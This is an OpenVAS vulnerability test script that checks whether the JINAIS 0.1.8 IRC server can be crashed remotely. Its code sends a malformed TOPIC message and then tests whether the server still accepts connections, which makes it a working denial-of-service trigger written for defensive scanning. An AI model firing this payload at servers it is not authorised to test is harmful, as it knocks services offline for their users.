###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jinais_38972.nasl 14 2013-10-27 12:33:37Z jan $
#
# JINAIS IRC Message Remote Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "JINAIS is prone to a remote denial-of-service vulnerability.

An attacker may exploit this issue to crash the application, resulting
in a denial-of-service condition.

JINAIS 0.1.8 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100554);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-03-26 13:01:50 +0100 (Fri, 26 Mar 2010)");
 script_bugtraq_id(38972);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_name("JINAIS IRC Message Remote Denial Of Service Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38972");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/jinais/");

 script_description(desc);
 script_summary("Determine if JINAIS is prone to a remote denial-of-service vulnerability");
 script_category(ACT_DENIAL);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "ircd.nasl");
 script_require_ports("Services/irc", 4002);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

if(safe_checks())exit(0);

port = get_kb_item("Services/irc");
if(!port)port = 4002;
if(! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);  
if(!soc)exit(0);

NICK = string("OpenVAS",rand());

send(socket:soc, data:string("NICK ",NICK, "\r\n"));
buf = recv(socket:soc, length:256);

if(buf == NULL)exit(0);

send(socket:soc, data:string("USER ",NICK,"\r\n"));
buf = recv(socket:soc, length:1024);
if(NICK >!< buf)exit(0);

send(socket:soc, data:string("TOPIC #",NICK,"\r\n"));
buf = recv(socket:soc, length:256);
close(soc);

soc1 = open_sock_tcp(port);
if(!soc1) {
  security_warning(port:port);
  exit(0);
} else {
  close(soc1);
}  

exit(0);
